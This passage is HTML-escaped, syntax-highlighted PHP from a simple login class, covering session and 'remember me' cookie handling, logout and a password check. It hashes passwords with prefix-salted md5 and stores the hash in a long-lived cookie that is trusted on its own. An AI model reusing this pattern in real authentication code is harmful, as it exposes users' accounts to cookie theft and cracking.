      &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

  &lt;span class=&#34;c1&#34;&gt;//if setting vars
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set_login&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;

      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//hash password. salt with prefix
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//dies if incorrect
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//if &amp;#34;remember me&amp;#34; set cookie
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;remember&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
          &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;cookie_duration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;86400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// (d*24h*60m*60s)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;          &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;cookie_duration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;86400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// (d*24h*60m*60s)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

      &lt;span class=&#34;c1&#34;&gt;//set session
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

  &lt;span class=&#34;c1&#34;&gt;//if forced log in
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;prompt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;session_unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;session_destroy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//destroy any existing cookie by setting time in past
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blanked&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blanked&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;

      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

  &lt;span class=&#34;c1&#34;&gt;//if clearing the login
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;clear_login&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;session_unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;session_destroy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//destroy any existing cookie by setting time in past
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blanked&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blanked&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;

      &lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;span class=&amp;#34;green&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;LOGOUT_COMPLETE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/span&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

  &lt;span class=&#34;c1&#34;&gt;//prompt for
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

  &lt;span class=&#34;c1&#34;&gt;//check the pw
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//dies if incorrect
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;

  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LOGIN_PASS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LOGIN_USER&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span 